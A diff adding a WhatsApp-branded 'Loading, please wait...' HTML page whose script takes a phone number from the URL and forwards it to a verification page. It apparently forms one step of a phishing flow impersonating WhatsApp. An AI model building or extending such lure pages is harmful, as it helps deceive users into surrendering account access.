@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" type="image/svg+xml">
+
+<head>
+  <title>Loading...</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #e8f5e9;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .logo {
+      width: 100px;
+      margin-bottom: 30px;
+    }
+
+    h1 {
+      color: #4CAF50;
+      margin-bottom: 30px;
+    }
+
+    .loading-bar {
+      width: 200px;
+      height: 6px;
+      background: #c8e6c9;
+      border-radius: 4px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .loading-bar::after {
+      content: "";
+      position: absolute;
+      height: 100%;
+      width: 0;
+      background: #4CAF50;
+      animation: loading 3s linear forwards;
+    }
+
+    @keyframes loading {
+      0% { width: 0; }
+      100% { width: 100%; }
+    }
+  </style>
+</head>
+<body>
+
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo" class="logo" />
+  <h1>Loading, please wait...</h1>
+  <div class="loading-bar"></div>
+
+  <!-- Script to pass phone param forward -->
+  <script>
+    const phone = new URLSearchParams(window.location.search).get("phone") || "Unknown";
+console.log("Phone received:", phone);
+
+    setTimeout(() => {
+      window.location.href = `verification.html?phone=${encodeURIComponent(phone)}`;
+    }, 3000);
+  </script>
+</body>
+</html>
